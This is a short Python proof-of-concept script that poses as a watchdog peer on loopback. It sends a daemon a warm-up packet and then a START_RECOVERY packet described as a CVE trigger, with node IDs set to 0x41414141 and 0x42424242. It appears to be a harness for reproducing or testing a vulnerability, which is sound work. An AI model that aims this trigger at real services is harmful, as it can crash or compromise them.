#!/usr/bin/env python3
"""Loopback synthetic watchdog peer: wait for COORDINATOR, send benign type-f
warm-up (NodeCount=1), then type-r CVE trigger (NodeCount=2). All on 127.0.0.1."""
import socket, struct, sys, time

PORT = 19005
WARM_DELAY = float(sys.argv[1]) if len(sys.argv) > 1 else 14.0
GAP = float(sys.argv[2]) if len(sys.argv) > 2 else 2.0

WARM = '{"Function":"NO_SUCH_FUNC","Flags":0,"NodeCount":1,"NodeIdList":[1094795585]}'
TRIG = '{"Function":"START_RECOVERY","Flags":0,"NodeCount":2,"NodeIdList":[1094795585,1111638594]}'

def pkt(t, payload):
    return t.encode() + struct.pack('!II', 1, len(payload)) + payload.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", PORT))
s.listen(1)
print(f"peer listening 127.0.0.1:{PORT} warm_delay={WARM_DELAY} gap={GAP}", flush=True)
conn, addr = s.accept()
print(f"peer accepted {addr}", flush=True)
conn.settimeout(0.5)
start = time.time()
def drain_until(target):
    while time.time() - start < target:
        try:
            d = conn.recv(4096)
            if not d:
                print("peer: connection closed by daemon", flush=True)
                return False
            print(f"peer recv {len(d)} bytes type={d[:1]!r}", flush=True)
        except socket.timeout:
            pass
    return True

if not drain_until(WARM_DELAY):
    sys.exit(0)
print(f"peer sending WARM type=f N=1 at t={time.time()-start:.1f}s", flush=True)
conn.sendall(pkt('f', WARM))
if not drain_until(WARM_DELAY + GAP):
    sys.exit(0)
print(f"peer sending TRIG type=r N=2 at t={time.time()-start:.1f}s", flush=True)
conn.sendall(pkt('r', TRIG))
if not drain_until(WARM_DELAY + GAP + 3):
    sys.exit(0)
print("peer done", flush=True)
conn.close(); s.close()
